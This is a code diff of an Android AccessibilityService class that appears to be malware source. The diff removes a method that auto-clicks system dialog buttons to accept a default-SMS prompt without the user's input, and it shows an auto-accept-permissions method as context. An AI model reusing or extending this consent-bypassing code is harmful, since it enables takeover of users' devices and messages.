@@ -22,9 +22,6 @@ public class MyAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
         AccessibilityNodeInfo rootInActiveWindow;
-        AccessibilityNodeInfo GetFirstNode;
-        rootInActiveWindow = getRootInActiveWindow();
-
         try {
             if (!(accessibilityEvent.getClassName() == null || (rootInActiveWindow = getRootInActiveWindow()) == null || accessibilityEvent.getPackageName() == null)) {
                 String charSequence = accessibilityEvent.getPackageName().toString();
@@ -75,35 +72,6 @@ public class MyAccessibilityService extends AccessibilityService {
         //info.notificationTimeout = 100;
 
         this.setServiceInfo(info);
-    }
-
-    private boolean SmsAutoAccept(AccessibilityNodeInfo accessibilityNodeInfo) {
-        AccessibilityNodeInfo GetFirstNode = GetFirstNode("android:id/button1", accessibilityNodeInfo, false);
-        if (GetFirstNode == null) {
-            return true;
-        }
-        if (!GetFirstNode.isEnabled()) {
-            List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(smsAutoAcceptPackageName);
-            for (int i = 0; i < findAccessibilityNodeInfosByText.size(); i++) {
-                AccessibilityNodeInfo accessibilityNodeInfo2 = findAccessibilityNodeInfosByText.get(i);
-                if (accessibilityNodeInfo2.getText().toString().equals(smsAutoAcceptPackageName)) {
-                    Click2Parent(accessibilityNodeInfo2);
-                    return true;
-                }
-            }
-            return true;
-        } else if (!GetFirstNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-            return true;
-        } else {
-            smsAutoAccept = false;
-            return true;
-        }
-    }
-
-    private void Click2Parent(AccessibilityNodeInfo accessibilityNodeInfo) {
-        for (int i = 0; i < 5 && accessibilityNodeInfo != null && !accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK); i++) {
-            accessibilityNodeInfo = accessibilityNodeInfo.getParent();
-        }
     }
 
     private boolean AutoAcceptPerms(AccessibilityNodeInfo accessibilityNodeInfo) {
